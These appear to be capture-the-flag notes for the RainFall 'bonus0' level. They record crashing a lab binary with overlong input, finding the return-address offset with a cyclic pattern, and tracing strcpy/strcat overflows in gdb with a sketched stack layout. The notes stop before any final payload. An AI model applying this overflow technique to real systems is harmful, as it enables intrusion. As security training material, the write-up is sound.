
```
bonus0@RainFall:~$ objdump -t bonus0 | grep text
080484b4 g     F .text	0000006a              p
0804851e g     F .text	00000086              pp
080485a4 g     F .text	00000028              main
```

```
bonus0@RainFall:~$ ./bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
Segmentation fault (core dumped)
```
using a recognizable pattern
```
cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
AAAAAAAAAAAAAAAAAAAAaaaabaaacaaadaaaeaaa�� aaaabaaacaaadaaaeaaa��

Program received signal SIGSEGV, Segmentation fault.
0x64616161 in ?? ()
```

offset

```
➜  Desktop cyclic -l 0x64616161
9
```


```

   0x0804852e <+16>:	lea    -0x30(%ebp),%eax
   0x08048531 <+19>:	mov    %eax,(%esp)
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
   0x08048544 <+38>:	mov    %eax,(%esp)
   0x08048547 <+41>:	call   0x80484b4 <p>
   
                +----EBP(pp)--------+
                +                   +                            
                +-------------------+                            
                +       ebx         +                            
                +-------------------+ -8                         
                +       b2[20]      +                            
                +-------------------+ -28  0x1c                      
                +       b1[20]      +                            
                +-------------------+ -48  0x30    
```
manually
```
pp
=> 0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>

(gdb) x/40wx $esp
0xbffff660:	0xbffff6d6	0xbffff688	0x00000000	0xb7fd0ff4
0xbffff670:	0xbffff6be	0xbffff6bf	0x00000001	0xb7ec3c49
0xbffff680:	0xbffff6bf	0xbffff6be	0x41414141	0x00000000
0xbffff690:	0x00000000	0x00000000	0x00000000	0x42424242

0xbffff69c - 0xbffff688 = 20
```

```
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
=> 0x0804859d <+127>:	add    $0x50,%esp

0xbffff6d0:	0xb7fd13e4	0x41410016	0x42204141	0x00424242
                          AA          AA B      BBB
                          
(gdb) i r
eax            0xbffff6d6	= "AAAA BBBB"
ecx            0x42424242	
edx            0x4	4                          
```

